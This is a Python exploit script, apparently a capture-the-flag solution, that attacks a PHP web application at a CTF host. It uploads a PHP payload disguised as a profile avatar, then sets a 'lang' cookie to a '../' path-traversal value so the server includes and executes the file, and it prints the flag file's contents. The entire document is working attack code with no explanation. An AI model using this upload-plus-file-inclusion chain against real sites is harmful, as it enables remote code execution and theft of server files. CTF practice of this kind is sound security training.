import re
import requests

URL = "https://i7n.dctf.si"

sess = requests.Session()

PAYLOAD = """
<?php 
    echo file_get_contents('./media/flag.txt');
?>
"""

print("Uploading payload:", PAYLOAD)

r1 = sess.post(
    URL + '/profile.php',
    data={
        'display_name': 'test',
        'bio': 'lol',
    },
    files={
        'avatar': ('test.php', PAYLOAD, 'application/octet-stream'),
    },
    allow_redirects=True,
)

r1.raise_for_status()

filename = re.search(r'<span class="file-name".+?(media/.+?)</span>', r1.text, flags=re.S).group(1)
print(f"Uploaded file name: {filename}")

cookie = '../' + filename.rsplit('.', 1)[0]
print("Setting language cookie to", cookie)

sess.cookies.set('lang', cookie)


r2 = sess.get(URL + '/profile.php')
r2.raise_for_status()

flag = re.search(r'dctf{.+?}', r2.text).group()

print(f"Flag: {flag}")

